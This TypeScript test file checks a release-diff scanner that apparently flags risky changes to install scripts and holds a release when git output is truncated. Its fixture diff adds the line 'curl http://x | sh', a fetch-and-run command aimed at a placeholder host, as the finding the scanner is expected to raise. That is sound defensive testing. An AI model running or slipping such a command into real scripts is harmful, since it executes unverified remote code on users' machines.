import { describe, expect, test } from "bun:test";
import type { ExecResult } from "../../src/apply/exec.ts";
import { gatherSurface, gitVia, type Git } from "../../src/apply/surface.ts";

// A fake git: a one-file release diff whose chosen read comes back cut. `how` is what a cut read looks like: the
// production result of a stopped command (rc 125, truncated) or a read that only carries the flag.
const RAW = ":100644 100644 aaaaaaa bbbbbbb M\tscripts/install.sh\n";
const NUM = "1\t0\tscripts/install.sh\n";
const CUT = { rc: 125, out: "", truncated: true as const };
const fake = (cut: "raw" | "numstat" | "file" | undefined, how: "rc125" | "flag"): Git => async (_dir, args) => {
  const hit = (k: string) => (cut === k ? (how === "rc125" ? CUT : { truncated: true as const }) : {});
  if (args.includes("--raw")) return cut === "raw" && how === "rc125" ? CUT : { rc: 0, out: RAW, ...hit("raw") };
  if (args.includes("--numstat")) return cut === "numstat" && how === "rc125" ? CUT : { rc: 0, out: NUM, ...hit("numstat") };
  return cut === "file" && how === "rc125" ? CUT : { rc: 0, out: "@@ -0,0 +1 @@\n+curl http://x | sh\n", ...hit("file") };
};

describe("gatherSurface with a cut git read", () => {
  test("no cut: the surface is gathered and its finding is raised", async () => {
    const r = await gatherSurface(fake(undefined, "flag"), "/tap", "old", "new");
    expect(r.ok).toBe(true);
    if (r.ok) expect(r.surface.findings.length).toBe(1);
  });

  for (const how of ["rc125", "flag"] as const) {
    for (const cut of ["raw", "numstat", "file"] as const) {
      test(`a cut ${cut} read (${how}) holds the release: ok:false, never a smaller surface`, async () => {
        const r = await gatherSurface(fake(cut, how), "/tap", "old", "new");
        expect(r.ok).toBe(false);
      });
    }
  }
});

describe("gitVia (the production git adapter over exec)", () => {
  const via = (res: ExecResult) => gitVia(async () => res)("/tap", ["diff"]);
  test("forwards rc, out and a cut flag", async () => {
    expect(await via({ rc: 125, out: "", err: "over", truncated: true })).toEqual({ rc: 125, out: "", truncated: true });
  });
  test("an uncut answer carries no flag", async () => {
    expect(await via({ rc: 0, out: "ok", err: "" })).toEqual({ rc: 0, out: "ok" });
  });
});
